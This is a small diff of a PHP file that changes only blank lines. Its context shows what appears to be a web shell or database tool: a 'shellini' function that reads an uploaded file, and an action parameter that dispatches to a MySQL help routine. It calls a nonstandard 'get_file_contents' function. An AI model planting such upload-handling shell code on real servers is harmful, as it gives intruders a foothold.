@@ -2,6 +2,7 @@
 error_reporting(7);
 ob_start();
 session_start();
+
 function shellini(){
     return get_file_contents($_FILES['upfile']['tmp_name']);
 }
@@ -13,9 +14,9 @@ function shellini(){
 	<body>
 <?php
 
+
 if(!empty($_GET['action']) && $_GET['action']=='help')
 	mysql_help();
-
 
 //-----------------------------------------------------------------------------------起始输入
 if(empty($_GET['action']))
